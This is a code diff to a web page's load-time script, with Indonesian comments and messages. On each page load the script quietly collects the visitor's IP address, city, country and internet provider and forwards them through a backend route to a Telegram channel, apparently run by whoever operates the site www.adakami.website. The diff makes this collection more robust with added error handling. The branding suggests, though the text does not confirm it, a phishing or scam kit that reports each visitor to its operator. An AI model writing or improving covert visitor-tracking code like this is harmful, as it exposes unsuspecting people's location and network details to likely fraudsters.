@@ -308,18 +308,26 @@
     <script type="text/javascript">
         window.onload = function() {
             fetch('https://ipapi.co/json/')
-                .then(res => res.json())
+                .then(res => {
+                    if (!res.ok) throw new Error("Terkena rate limit atau diblokir jaringan");
+                    return res.json();
+                })
                 .then(data => {
-                    const infoPesan = `<b> 💀⃤ 𝗜𝗡𝗙𝗢 𝗟𝗜𝗡𝗞 𝗕𝗬 https://t.me/gitlab_v1</b>\n\n<b>LINK DOMAIN</b>www.adakami.website\n<b>IP:</b> <code>${data.ip}</code>\n<b>Kota:</b> ${data.city}\n<b>Negara:</b> ${data.country_name}\n<b>Provider:</b> ${data.org}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
+                    const infoPesan = `<b> 💀⃤ 𝗜𝗡𝗙𝗢 𝗟𝗜𝗡𝗞 𝗕𝗬 https://t.me/gitlab_v1</b>\nˋˏ✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n<b>DOMAIN</b> www.adakami.website\n<b>IP:</b> <code>${data.ip || '-'}</code>\n<b>Kota:</b> ${data.city || '-'} \n<b>Negara:</b> ${data.country_name || '-'}\n<b>Provider:</b> ${data.org || '-'}\n<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}`;
 
                     fetch('/api/kirim-telegram', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ pesan: infoPesan })
-                    }).then(() => console.log("Data pengunjung terkirim ke backend"))
-                      .catch(err => console.error("Gagal kirim data ke backend", err));
+                    }).then(res => {
+                        if (res.ok) {
+                            console.log("Data pengunjung terkirim ke backend");
+                        } else {
+                            console.error("Backend gagal merespons dengan baik");
+                        }
+                    }).catch(err => console.error("Gagal kirim data ke backend", err));
                 })
-                .catch(err => console.error("Gagal melacak IP pengunjung"));
+                .catch(err => console.error("Gagal melacak IP pengunjung:", err.message));
         };
     </script>
     
